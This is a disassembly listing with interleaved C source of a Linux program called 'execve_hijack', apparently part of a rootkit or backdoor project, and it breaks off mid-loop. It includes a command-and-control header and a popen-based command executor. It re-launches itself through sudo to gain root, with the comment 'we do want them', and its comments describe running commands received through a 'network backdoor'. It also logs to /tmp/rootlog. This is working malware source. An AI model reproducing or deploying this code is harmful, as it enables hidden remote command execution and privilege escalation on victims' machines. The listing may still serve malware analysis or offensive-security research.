
execve_hijack:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    $0x8,%rsp
  401008:	48 8b 05 e9 3f 00 00 	mov    0x3fe9(%rip),%rax        # 404ff8 <__gmon_start__>
  40100f:	48 85 c0             	test   %rax,%rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   *%rax
  401016:	48 83 c4 08          	add    $0x8,%rsp
  40101a:	c3                   	ret    

Disassembly of section .plt:

0000000000401020 <inet_ntop@plt-0x10>:
  401020:	ff 35 e2 3f 00 00    	push   0x3fe2(%rip)        # 405008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	ff 25 e4 3f 00 00    	jmp    *0x3fe4(%rip)        # 405010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401030 <inet_ntop@plt>:
  401030:	ff 25 e2 3f 00 00    	jmp    *0x3fe2(%rip)        # 405018 <inet_ntop@GLIBC_2.2.5>
  401036:	68 00 00 00 00       	push   $0x0
  40103b:	e9 e0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401040 <free@plt>:
  401040:	ff 25 da 3f 00 00    	jmp    *0x3fda(%rip)        # 405020 <free@GLIBC_2.2.5>
  401046:	68 01 00 00 00       	push   $0x1
  40104b:	e9 d0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401050 <localtime@plt>:
  401050:	ff 25 d2 3f 00 00    	jmp    *0x3fd2(%rip)        # 405028 <localtime@GLIBC_2.2.5>
  401056:	68 02 00 00 00       	push   $0x2
  40105b:	e9 c0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401060 <strncmp@plt>:
  401060:	ff 25 ca 3f 00 00    	jmp    *0x3fca(%rip)        # 405030 <strncmp@GLIBC_2.2.5>
  401066:	68 03 00 00 00       	push   $0x3
  40106b:	e9 b0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401070 <strcpy@plt>:
  401070:	ff 25 c2 3f 00 00    	jmp    *0x3fc2(%rip)        # 405038 <strcpy@GLIBC_2.2.5>
  401076:	68 04 00 00 00       	push   $0x4
  40107b:	e9 a0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401080 <setsockopt@plt>:
  401080:	ff 25 ba 3f 00 00    	jmp    *0x3fba(%rip)        # 405040 <setsockopt@GLIBC_2.2.5>
  401086:	68 05 00 00 00       	push   $0x5
  40108b:	e9 90 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401090 <write@plt>:
  401090:	ff 25 b2 3f 00 00    	jmp    *0x3fb2(%rip)        # 405048 <write@GLIBC_2.2.5>
  401096:	68 06 00 00 00       	push   $0x6
  40109b:	e9 80 ff ff ff       	jmp    401020 <_init+0x20>

00000000004010a0 <inet_ntoa@plt>:
  4010a0:	ff 25 aa 3f 00 00    	jmp    *0x3faa(%rip)        # 405050 <inet_ntoa@GLIBC_2.2.5>
  4010a6:	68 07 00 00 00       	push   $0x7
  4010ab:	e9 70 ff ff ff       	jmp    401020 <_init+0x20>

00000000004010b0 <strlen@plt>:
  4010b0:	ff 25 a2 3f 00 00    	jmp    *0x3fa2(%rip)        # 405058 <strlen@GLIBC_2.2.5>
  4010b6:	68 08 00 00 00       	push   $0x8
  4010bb:	e9 60 ff ff ff       	jmp    401020 <_init+0x20>

00000000004010c0 <__stack_chk_fail@plt>:
  4010c0:	ff 25 9a 3f 00 00    	jmp    *0x3f9a(%rip)        # 405060 <__stack_chk_fail@GLIBC_2.4>
  4010c6:	68 09 00 00 00       	push   $0x9
  4010cb:	e9 50 ff ff ff       	jmp    401020 <_init+0x20>

00000000004010d0 <asctime@plt>:
  4010d0:	ff 25 92 3f 00 00    	jmp    *0x3f92(%rip)        # 405068 <asctime@GLIBC_2.2.5>
  4010d6:	68 0a 00 00 00       	push   $0xa
  4010db:	e9 40 ff ff ff       	jmp    401020 <_init+0x20>

00000000004010e0 <htons@plt>:
  4010e0:	ff 25 8a 3f 00 00    	jmp    *0x3f8a(%rip)        # 405070 <htons@GLIBC_2.2.5>
  4010e6:	68 0b 00 00 00       	push   $0xb
  4010eb:	e9 30 ff ff ff       	jmp    401020 <_init+0x20>

00000000004010f0 <printf@plt>:
  4010f0:	ff 25 82 3f 00 00    	jmp    *0x3f82(%rip)        # 405078 <printf@GLIBC_2.2.5>
  4010f6:	68 0c 00 00 00       	push   $0xc
  4010fb:	e9 20 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401100 <pclose@plt>:
  401100:	ff 25 7a 3f 00 00    	jmp    *0x3f7a(%rip)        # 405080 <pclose@GLIBC_2.2.5>
  401106:	68 0d 00 00 00       	push   $0xd
  40110b:	e9 10 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401110 <htonl@plt>:
  401110:	ff 25 72 3f 00 00    	jmp    *0x3f72(%rip)        # 405088 <htonl@GLIBC_2.2.5>
  401116:	68 0e 00 00 00       	push   $0xe
  40111b:	e9 00 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401120 <memset@plt>:
  401120:	ff 25 6a 3f 00 00    	jmp    *0x3f6a(%rip)        # 405090 <memset@GLIBC_2.2.5>
  401126:	68 0f 00 00 00       	push   $0xf
  40112b:	e9 f0 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401130 <geteuid@plt>:
  401130:	ff 25 62 3f 00 00    	jmp    *0x3f62(%rip)        # 405098 <geteuid@GLIBC_2.2.5>
  401136:	68 10 00 00 00       	push   $0x10
  40113b:	e9 e0 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401140 <sendto@plt>:
  401140:	ff 25 5a 3f 00 00    	jmp    *0x3f5a(%rip)        # 4050a0 <sendto@GLIBC_2.2.5>
  401146:	68 11 00 00 00       	push   $0x11
  40114b:	e9 d0 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401150 <close@plt>:
  401150:	ff 25 52 3f 00 00    	jmp    *0x3f52(%rip)        # 4050a8 <close@GLIBC_2.2.5>
  401156:	68 12 00 00 00       	push   $0x12
  40115b:	e9 c0 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401160 <fgets@plt>:
  401160:	ff 25 4a 3f 00 00    	jmp    *0x3f4a(%rip)        # 4050b0 <fgets@GLIBC_2.2.5>
  401166:	68 13 00 00 00       	push   $0x13
  40116b:	e9 b0 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401170 <execve@plt>:
  401170:	ff 25 42 3f 00 00    	jmp    *0x3f42(%rip)        # 4050b8 <execve@GLIBC_2.2.5>
  401176:	68 14 00 00 00       	push   $0x14
  40117b:	e9 a0 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401180 <calloc@plt>:
  401180:	ff 25 3a 3f 00 00    	jmp    *0x3f3a(%rip)        # 4050c0 <calloc@GLIBC_2.2.5>
  401186:	68 15 00 00 00       	push   $0x15
  40118b:	e9 90 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401190 <strcmp@plt>:
  401190:	ff 25 32 3f 00 00    	jmp    *0x3f32(%rip)        # 4050c8 <strcmp@GLIBC_2.2.5>
  401196:	68 16 00 00 00       	push   $0x16
  40119b:	e9 80 fe ff ff       	jmp    401020 <_init+0x20>

00000000004011a0 <gethostbyname@plt>:
  4011a0:	ff 25 2a 3f 00 00    	jmp    *0x3f2a(%rip)        # 4050d0 <gethostbyname@GLIBC_2.2.5>
  4011a6:	68 17 00 00 00       	push   $0x17
  4011ab:	e9 70 fe ff ff       	jmp    401020 <_init+0x20>

00000000004011b0 <fprintf@plt>:
  4011b0:	ff 25 22 3f 00 00    	jmp    *0x3f22(%rip)        # 4050d8 <fprintf@GLIBC_2.2.5>
  4011b6:	68 18 00 00 00       	push   $0x18
  4011bb:	e9 60 fe ff ff       	jmp    401020 <_init+0x20>

00000000004011c0 <memcpy@plt>:
  4011c0:	ff 25 1a 3f 00 00    	jmp    *0x3f1a(%rip)        # 4050e0 <memcpy@GLIBC_2.14>
  4011c6:	68 19 00 00 00       	push   $0x19
  4011cb:	e9 50 fe ff ff       	jmp    401020 <_init+0x20>

00000000004011d0 <inet_pton@plt>:
  4011d0:	ff 25 12 3f 00 00    	jmp    *0x3f12(%rip)        # 4050e8 <inet_pton@GLIBC_2.2.5>
  4011d6:	68 1a 00 00 00       	push   $0x1a
  4011db:	e9 40 fe ff ff       	jmp    401020 <_init+0x20>

00000000004011e0 <time@plt>:
  4011e0:	ff 25 0a 3f 00 00    	jmp    *0x3f0a(%rip)        # 4050f0 <time@GLIBC_2.2.5>
  4011e6:	68 1b 00 00 00       	push   $0x1b
  4011eb:	e9 30 fe ff ff       	jmp    401020 <_init+0x20>

00000000004011f0 <malloc@plt>:
  4011f0:	ff 25 02 3f 00 00    	jmp    *0x3f02(%rip)        # 4050f8 <malloc@GLIBC_2.2.5>
  4011f6:	68 1c 00 00 00       	push   $0x1c
  4011fb:	e9 20 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401200 <recvfrom@plt>:
  401200:	ff 25 fa 3e 00 00    	jmp    *0x3efa(%rip)        # 405100 <recvfrom@GLIBC_2.2.5>
  401206:	68 1d 00 00 00       	push   $0x1d
  40120b:	e9 10 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401210 <open@plt>:
  401210:	ff 25 f2 3e 00 00    	jmp    *0x3ef2(%rip)        # 405108 <open@GLIBC_2.2.5>
  401216:	68 1e 00 00 00       	push   $0x1e
  40121b:	e9 00 fe ff ff       	jmp    401020 <_init+0x20>

0000000000401220 <popen@plt>:
  401220:	ff 25 ea 3e 00 00    	jmp    *0x3eea(%rip)        # 405110 <popen@GLIBC_2.2.5>
  401226:	68 1f 00 00 00       	push   $0x1f
  40122b:	e9 f0 fd ff ff       	jmp    401020 <_init+0x20>

0000000000401230 <perror@plt>:
  401230:	ff 25 e2 3e 00 00    	jmp    *0x3ee2(%rip)        # 405118 <perror@GLIBC_2.2.5>
  401236:	68 20 00 00 00       	push   $0x20
  40123b:	e9 e0 fd ff ff       	jmp    401020 <_init+0x20>

0000000000401240 <strtok@plt>:
  401240:	ff 25 da 3e 00 00    	jmp    *0x3eda(%rip)        # 405120 <strtok@GLIBC_2.2.5>
  401246:	68 21 00 00 00       	push   $0x21
  40124b:	e9 d0 fd ff ff       	jmp    401020 <_init+0x20>

0000000000401250 <strcat@plt>:
  401250:	ff 25 d2 3e 00 00    	jmp    *0x3ed2(%rip)        # 405128 <strcat@GLIBC_2.2.5>
  401256:	68 22 00 00 00       	push   $0x22
  40125b:	e9 c0 fd ff ff       	jmp    401020 <_init+0x20>

0000000000401260 <gethostname@plt>:
  401260:	ff 25 ca 3e 00 00    	jmp    *0x3eca(%rip)        # 405130 <gethostname@GLIBC_2.2.5>
  401266:	68 23 00 00 00       	push   $0x23
  40126b:	e9 b0 fd ff ff       	jmp    401020 <_init+0x20>

0000000000401270 <exit@plt>:
  401270:	ff 25 c2 3e 00 00    	jmp    *0x3ec2(%rip)        # 405138 <exit@GLIBC_2.2.5>
  401276:	68 24 00 00 00       	push   $0x24
  40127b:	e9 a0 fd ff ff       	jmp    401020 <_init+0x20>

0000000000401280 <socket@plt>:
  401280:	ff 25 ba 3e 00 00    	jmp    *0x3eba(%rip)        # 405140 <socket@GLIBC_2.2.5>
  401286:	68 25 00 00 00       	push   $0x25
  40128b:	e9 90 fd ff ff       	jmp    401020 <_init+0x20>

Disassembly of section .text:

0000000000401290 <_start>:
  401290:	f3 0f 1e fa          	endbr64 
  401294:	31 ed                	xor    %ebp,%ebp
  401296:	49 89 d1             	mov    %rdx,%r9
  401299:	5e                   	pop    %rsi
  40129a:	48 89 e2             	mov    %rsp,%rdx
  40129d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4012a1:	50                   	push   %rax
  4012a2:	54                   	push   %rsp
  4012a3:	49 c7 c0 70 2d 40 00 	mov    $0x402d70,%r8
  4012aa:	48 c7 c1 00 2d 40 00 	mov    $0x402d00,%rcx
  4012b1:	48 c7 c7 20 15 40 00 	mov    $0x401520,%rdi
  4012b8:	ff 15 32 3d 00 00    	call   *0x3d32(%rip)        # 404ff0 <__libc_start_main@GLIBC_2.2.5>
  4012be:	f4                   	hlt    
  4012bf:	90                   	nop

00000000004012c0 <_dl_relocate_static_pie>:
  4012c0:	f3 0f 1e fa          	endbr64 
  4012c4:	c3                   	ret    
  4012c5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4012cc:	00 00 00 
  4012cf:	90                   	nop

00000000004012d0 <deregister_tm_clones>:
  4012d0:	b8 58 51 40 00       	mov    $0x405158,%eax
  4012d5:	48 3d 58 51 40 00    	cmp    $0x405158,%rax
  4012db:	74 13                	je     4012f0 <deregister_tm_clones+0x20>
  4012dd:	b8 00 00 00 00       	mov    $0x0,%eax
  4012e2:	48 85 c0             	test   %rax,%rax
  4012e5:	74 09                	je     4012f0 <deregister_tm_clones+0x20>
  4012e7:	bf 58 51 40 00       	mov    $0x405158,%edi
  4012ec:	ff e0                	jmp    *%rax
  4012ee:	66 90                	xchg   %ax,%ax
  4012f0:	c3                   	ret    
  4012f1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4012f8:	00 00 00 00 
  4012fc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401300 <register_tm_clones>:
  401300:	be 58 51 40 00       	mov    $0x405158,%esi
  401305:	48 81 ee 58 51 40 00 	sub    $0x405158,%rsi
  40130c:	48 89 f0             	mov    %rsi,%rax
  40130f:	48 c1 ee 3f          	shr    $0x3f,%rsi
  401313:	48 c1 f8 03          	sar    $0x3,%rax
  401317:	48 01 c6             	add    %rax,%rsi
  40131a:	48 d1 fe             	sar    %rsi
  40131d:	74 11                	je     401330 <register_tm_clones+0x30>
  40131f:	b8 00 00 00 00       	mov    $0x0,%eax
  401324:	48 85 c0             	test   %rax,%rax
  401327:	74 07                	je     401330 <register_tm_clones+0x30>
  401329:	bf 58 51 40 00       	mov    $0x405158,%edi
  40132e:	ff e0                	jmp    *%rax
  401330:	c3                   	ret    
  401331:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401338:	00 00 00 00 
  40133c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401340 <__do_global_dtors_aux>:
  401340:	f3 0f 1e fa          	endbr64 
  401344:	80 3d 1d 3e 00 00 00 	cmpb   $0x0,0x3e1d(%rip)        # 405168 <completed.0>
  40134b:	75 13                	jne    401360 <__do_global_dtors_aux+0x20>
  40134d:	55                   	push   %rbp
  40134e:	48 89 e5             	mov    %rsp,%rbp
  401351:	e8 7a ff ff ff       	call   4012d0 <deregister_tm_clones>
  401356:	c6 05 0b 3e 00 00 01 	movb   $0x1,0x3e0b(%rip)        # 405168 <completed.0>
  40135d:	5d                   	pop    %rbp
  40135e:	c3                   	ret    
  40135f:	90                   	nop
  401360:	c3                   	ret    
  401361:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401368:	00 00 00 00 
  40136c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401370 <frame_dummy>:
  401370:	f3 0f 1e fa          	endbr64 
  401374:	eb 8a                	jmp    401300 <register_tm_clones>
  401376:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40137d:	00 00 00 

0000000000401380 <execute_command>:

#include "lib/RawTCP.h"
#include "../common/c&c.h"


char* execute_command(char* command){
  401380:	55                   	push   %rbp
  401381:	48 89 e5             	mov    %rsp,%rbp
  401384:	48 81 ec 20 04 00 00 	sub    $0x420,%rsp
  40138b:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)

    FILE *fp;
    char* res = calloc(4096, sizeof(char));
  40138f:	bf 00 10 00 00       	mov    $0x1000,%edi
  401394:	be 01 00 00 00       	mov    $0x1,%esi
  401399:	e8 e2 fd ff ff       	call   401180 <calloc@plt>
  40139e:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    char buf[1024];

    fp = popen(command, "r");
  4013a2:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
  4013a6:	48 be 04 30 40 00 00 	movabs $0x403004,%rsi
  4013ad:	00 00 00 
  4013b0:	e8 6b fe ff ff       	call   401220 <popen@plt>
  4013b5:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    if(fp == NULL) {
  4013b9:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
  4013be:	0f 85 24 00 00 00    	jne    4013e8 <execute_command+0x68>
        printf("Failed to run command\n" );
  4013c4:	48 bf 06 30 40 00 00 	movabs $0x403006,%rdi
  4013cb:	00 00 00 
  4013ce:	b0 00                	mov    $0x0,%al
  4013d0:	e8 1b fd ff ff       	call   4010f0 <printf@plt>
        return "COMMAND ERROR";
  4013d5:	48 b8 1d 30 40 00 00 	movabs $0x40301d,%rax
  4013dc:	00 00 00 
  4013df:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4013e3:	e9 5f 00 00 00       	jmp    401447 <execute_command+0xc7>
    }

    while(fgets(buf, sizeof(buf), fp) != NULL) {
  4013e8:	e9 00 00 00 00       	jmp    4013ed <execute_command+0x6d>
  4013ed:	48 8d bd e0 fb ff ff 	lea    -0x420(%rbp),%rdi
  4013f4:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  4013f8:	be 00 04 00 00       	mov    $0x400,%esi
  4013fd:	e8 5e fd ff ff       	call   401160 <fgets@plt>
  401402:	48 83 f8 00          	cmp    $0x0,%rax
  401406:	0f 84 15 00 00 00    	je     401421 <execute_command+0xa1>
        strcat(res, buf);
  40140c:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
  401410:	48 8d b5 e0 fb ff ff 	lea    -0x420(%rbp),%rsi
  401417:	e8 34 fe ff ff       	call   401250 <strcat@plt>
    while(fgets(buf, sizeof(buf), fp) != NULL) {
  40141c:	e9 cc ff ff ff       	jmp    4013ed <execute_command+0x6d>
    }
    printf("RESULT OF COMMAND: %s\n", res);
  401421:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  401425:	48 bf 2b 30 40 00 00 	movabs $0x40302b,%rdi
  40142c:	00 00 00 
  40142f:	b0 00                	mov    $0x0,%al
  401431:	e8 ba fc ff ff       	call   4010f0 <printf@plt>

    pclose(fp);
  401436:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
  40143a:	e8 c1 fc ff ff       	call   401100 <pclose@plt>
    return res;
  40143f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401443:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
}
  401447:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40144b:	48 81 c4 20 04 00 00 	add    $0x420,%rsp
  401452:	5d                   	pop    %rbp
  401453:	c3                   	ret    
  401454:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40145b:	00 00 00 
  40145e:	66 90                	xchg   %ax,%ax

0000000000401460 <getLocalIpAddress>:


char* getLocalIpAddress(){
  401460:	55                   	push   %rbp
  401461:	48 89 e5             	mov    %rsp,%rbp
  401464:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
  40146b:	bf 00 01 00 00       	mov    $0x100,%edi
  401470:	be 01 00 00 00       	mov    $0x1,%esi
  401475:	e8 06 fd ff ff       	call   401180 <calloc@plt>
  40147a:	48 89 85 f8 fe ff ff 	mov    %rax,-0x108(%rbp)
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
  401481:	48 8d bd 00 ff ff ff 	lea    -0x100(%rbp),%rdi
  401488:	be 00 01 00 00       	mov    $0x100,%esi
  40148d:	e8 ce fd ff ff       	call   401260 <gethostname@plt>
  401492:	89 85 ec fe ff ff    	mov    %eax,-0x114(%rbp)
    if(hostname==-1){
  401498:	83 bd ec fe ff ff ff 	cmpl   $0xffffffff,-0x114(%rbp)
  40149f:	0f 85 0a 00 00 00    	jne    4014af <getLocalIpAddress+0x4f>
        exit(1);
  4014a5:	bf 01 00 00 00       	mov    $0x1,%edi
  4014aa:	e8 c1 fd ff ff       	call   401270 <exit@plt>
    }
  
    host_entry = gethostbyname(hostbuffer);
  4014af:	48 8d bd 00 ff ff ff 	lea    -0x100(%rbp),%rdi
  4014b6:	e8 e5 fc ff ff       	call   4011a0 <gethostbyname@plt>
  4014bb:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
    if(host_entry == NULL){
  4014c2:	48 83 bd f0 fe ff ff 	cmpq   $0x0,-0x110(%rbp)
  4014c9:	00 
  4014ca:	0f 85 0a 00 00 00    	jne    4014da <getLocalIpAddress+0x7a>
        exit(1);
  4014d0:	bf 01 00 00 00       	mov    $0x1,%edi
  4014d5:	e8 96 fd ff ff       	call   401270 <exit@plt>
    }
  
    // To convert an Internet network
    // address into ASCII string
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  4014da:	48 8b 85 f8 fe ff ff 	mov    -0x108(%rbp),%rax
  4014e1:	48 89 85 e0 fe ff ff 	mov    %rax,-0x120(%rbp)
  4014e8:	48 8b 85 f0 fe ff ff 	mov    -0x110(%rbp),%rax
  4014ef:	48 8b 40 18          	mov    0x18(%rax),%rax
  4014f3:	48 8b 00             	mov    (%rax),%rax
  4014f6:	8b 38                	mov    (%rax),%edi
  4014f8:	e8 a3 fb ff ff       	call   4010a0 <inet_ntoa@plt>
  4014fd:	48 8b bd e0 fe ff ff 	mov    -0x120(%rbp),%rdi
  401504:	48 89 c6             	mov    %rax,%rsi
  401507:	e8 64 fb ff ff       	call   401070 <strcpy@plt>
  
    return IPbuffer;
  40150c:	48 8b 85 f8 fe ff ff 	mov    -0x108(%rbp),%rax
  401513:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  40151a:	5d                   	pop    %rbp
  40151b:	c3                   	ret    
  40151c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401520 <main>:
}

int main(int argc, char* argv[], char *envp[]){
  401520:	55                   	push   %rbp
  401521:	48 89 e5             	mov    %rsp,%rbp
  401524:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
  40152b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  401532:	89 7d f8             	mov    %edi,-0x8(%rbp)
  401535:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  401539:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    printf("Hello world from execve hijacker\n");
  40153d:	48 bf 42 30 40 00 00 	movabs $0x403042,%rdi
  401544:	00 00 00 
  401547:	b0 00                	mov    $0x0,%al
  401549:	e8 a2 fb ff ff       	call   4010f0 <printf@plt>
    for(int ii=0; ii<argc; ii++){
  40154e:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
  401555:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  401558:	3b 45 f8             	cmp    -0x8(%rbp),%eax
  40155b:	0f 8d 2e 00 00 00    	jge    40158f <main+0x6f>
        printf("Argument %i is %s\n", ii, argv[ii]);
  401561:	8b 75 e4             	mov    -0x1c(%rbp),%esi
  401564:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401568:	48 63 4d e4          	movslq -0x1c(%rbp),%rcx
  40156c:	48 8b 14 c8          	mov    (%rax,%rcx,8),%rdx
  401570:	48 bf 64 30 40 00 00 	movabs $0x403064,%rdi
  401577:	00 00 00 
  40157a:	b0 00                	mov    $0x0,%al
  40157c:	e8 6f fb ff ff       	call   4010f0 <printf@plt>
    for(int ii=0; ii<argc; ii++){
  401581:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  401584:	83 c0 01             	add    $0x1,%eax
  401587:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  40158a:	e9 c6 ff ff ff       	jmp    401555 <main+0x35>
    }
    
    execute_command("ls");
  40158f:	48 bf 77 30 40 00 00 	movabs $0x403077,%rdi
  401596:	00 00 00 
  401599:	e8 e2 fd ff ff       	call   401380 <execute_command>
    
    time_t rawtime;
    struct tm * timeinfo;

    time ( &rawtime );
  40159e:	48 8d 7d d8          	lea    -0x28(%rbp),%rdi
  4015a2:	e8 39 fc ff ff       	call   4011e0 <time@plt>
    timeinfo = localtime ( &rawtime );
  4015a7:	48 8d 7d d8          	lea    -0x28(%rbp),%rdi
  4015ab:	e8 a0 fa ff ff       	call   401050 <localtime@plt>
  4015b0:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    char* timestr = asctime(timeinfo);
  4015b4:	48 8b 7d d0          	mov    -0x30(%rbp),%rdi
  4015b8:	e8 13 fb ff ff       	call   4010d0 <asctime@plt>
  4015bd:	48 89 45 c8          	mov    %rax,-0x38(%rbp)


    if(geteuid() != 0){
  4015c1:	e8 6a fb ff ff       	call   401130 <geteuid@plt>
  4015c6:	83 f8 00             	cmp    $0x0,%eax
  4015c9:	0f 84 bd 00 00 00    	je     40168c <main+0x16c>
        //We do not have privileges, but we do want them. Let's rerun the program now.
        char* args[argc+1]; 
  4015cf:	8b 45 f8             	mov    -0x8(%rbp),%eax
  4015d2:	83 c0 01             	add    $0x1,%eax
  4015d5:	89 c1                	mov    %eax,%ecx
  4015d7:	48 89 e0             	mov    %rsp,%rax
  4015da:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4015de:	48 8d 14 cd 0f 00 00 	lea    0xf(,%rcx,8),%rdx
  4015e5:	00 
  4015e6:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
  4015ea:	48 89 e0             	mov    %rsp,%rax
  4015ed:	48 29 d0             	sub    %rdx,%rax
  4015f0:	48 89 85 b8 fe ff ff 	mov    %rax,-0x148(%rbp)
  4015f7:	48 89 c4             	mov    %rax,%rsp
  4015fa:	48 89 4d b8          	mov    %rcx,-0x48(%rbp)
        args[0] = argv[0];
  4015fe:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  401602:	48 8b 09             	mov    (%rcx),%rcx
  401605:	48 89 08             	mov    %rcx,(%rax)
        for(int ii=0; ii<argc; ii++){
  401608:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%rbp)
  40160f:	8b 45 b4             	mov    -0x4c(%rbp),%eax
  401612:	3b 45 f8             	cmp    -0x8(%rbp),%eax
  401615:	0f 8d 2e 00 00 00    	jge    401649 <main+0x129>
  40161b:	48 8b 85 b8 fe ff ff 	mov    -0x148(%rbp),%rax
            args[ii+1] = argv[ii];
  401622:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  401626:	48 63 55 b4          	movslq -0x4c(%rbp),%rdx
  40162a:	48 8b 14 d1          	mov    (%rcx,%rdx,8),%rdx
  40162e:	8b 4d b4             	mov    -0x4c(%rbp),%ecx
  401631:	83 c1 01             	add    $0x1,%ecx
  401634:	48 63 c9             	movslq %ecx,%rcx
  401637:	48 89 14 c8          	mov    %rdx,(%rax,%rcx,8)
        for(int ii=0; ii<argc; ii++){
  40163b:	8b 45 b4             	mov    -0x4c(%rbp),%eax
  40163e:	83 c0 01             	add    $0x1,%eax
  401641:	89 45 b4             	mov    %eax,-0x4c(%rbp)
  401644:	e9 c6 ff ff ff       	jmp    40160f <main+0xef>
  401649:	48 8b b5 b8 fe ff ff 	mov    -0x148(%rbp),%rsi
        }
        if(execve("/usr/bin/sudo", args, envp)<0){
  401650:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  401654:	48 bf 7a 30 40 00 00 	movabs $0x40307a,%rdi
  40165b:	00 00 00 
  40165e:	e8 0d fb ff ff       	call   401170 <execve@plt>
  401663:	83 f8 00             	cmp    $0x0,%eax
  401666:	0f 8d 19 00 00 00    	jge    401685 <main+0x165>
            perror("Failed to execve()");
  40166c:	48 bf 88 30 40 00 00 	movabs $0x403088,%rdi
  401673:	00 00 00 
  401676:	e8 b5 fb ff ff       	call   401230 <perror@plt>
            exit(-1);
  40167b:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  401680:	e8 eb fb ff ff       	call   401270 <exit@plt>
        }
    }
  401685:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  401689:	48 89 c4             	mov    %rax,%rsp

    //We proceed to fork() and exec the original program, whilst also executing the one we 
    //ordered to execute via the network backdoor
    //int bpf_map_fd = bpf_map_get_fd_by_id()

    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
  40168c:	48 bf 9b 30 40 00 00 	movabs $0x40309b,%rdi
  401693:	00 00 00 
  401696:	be 42 02 00 00       	mov    $0x242,%esi
  40169b:	ba b6 01 00 00       	mov    $0x1b6,%edx
  4016a0:	b0 00                	mov    $0x0,%al
  4016a2:	e8 69 fb ff ff       	call   401210 <open@plt>
  4016a7:	89 45 b0             	mov    %eax,-0x50(%rbp)
    if(fd<0){
  4016aa:	83 7d b0 00          	cmpl   $0x0,-0x50(%rbp)
  4016ae:	0f 8d 0f 00 00 00    	jge    4016c3 <main+0x1a3>
        perror("Failed to open log file");
  4016b4:	48 bf a8 30 40 00 00 	movabs $0x4030a8,%rdi
  4016bb:	00 00 00 
  4016be:	e8 6d fb ff ff       	call   401230 <perror@plt>
        //return -1;
    }

    int ii = 0;
  4016c3:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%rbp)
    while(*(timestr+ii)!='\0'){
  4016ca:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4016ce:	48 63 4d ac          	movslq -0x54(%rbp),%rcx
  4016d2:	0f be 04 08          	movsbl (%rax,%rcx,1),%eax
  4016d6:	83 f8 00             	cmp    $0x0,%eax
  4016d9:	0f 84 26 00 00 00    	je     401705 <main+0x1e5>
        write(fd, timestr+ii, 1);
